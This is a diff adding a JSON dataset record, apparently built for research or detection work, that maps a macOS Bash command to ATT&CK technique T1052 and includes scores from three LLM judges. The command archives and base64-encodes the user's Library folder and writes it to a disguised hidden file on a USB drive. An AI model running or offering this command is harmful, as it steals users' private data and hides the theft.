@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1052",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "tar -czf - \"$HOME/Library\" | base64 | dd of=\"/Volumes/USB/.printerlogs.txt\" bs=4m conv=sync && sync",
+  "explanation": "Packages the user's Library folder, base64-encodes it to appear text-like, and writes it to a log-looking file on a removable drive using dd.",
+  "rationale_steps": [
+    "Archive the Library directory to a single stream.",
+    "Apply base64 to make the payload appear as textual data to simple content scanners.",
+    "Write the encoded stream to the external media via dd.",
+    "Sync to ensure all data is committed to the USB device."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-24937b47-be34993e",
+  "source_prompt_hash": "24937b47",
+  "timestamp_utc": "2025-09-30T05:19:16.168507Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed pipeline with valid BSD tar/base64/dd options, balanced quoting, and proper redirection/conditionals.",
+        "semantic_score": 5,
+        "semantic_justification": "Effectively compresses the user's Library, base64-encodes it, and writes to a hidden log-like file on a USB volume, aligning with physical exfiltration (though conv=sync may add trailing NUL padding).",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T08:15:49.693803Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is well-formed with proper piping, quoting, and flags, though using `dd` to write base64 text output with `bs=4m conv=sync` is slightly awkward since `conv=sync` pads blocks to the block size, which could corrupt the base64 output, but the overall syntax is parseable and would execute.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1052 by compressing the Library folder with tar, base64-encoding it to disguise binary data as text, writing it to a removable USB volume with a deceptive filename (.printerlogs.txt), and using sync to ensure data is flushed — all consistent with staging, obfuscation, and physical medium exfiltration behaviors described in the technique.",
+        "combined_score": 4.5,
+        "confidence": 0.85,
+        "timestamp": "2026-02-18T22:35:43.178785Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses standard syntax for tar, base64, and dd with correct piping, quoting, and logical operators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command effectively packages sensitive macOS user data, obfuscates it as a text-like hidden file, and writes it to a standard external media mount point.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-18T22:35:47.152203Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
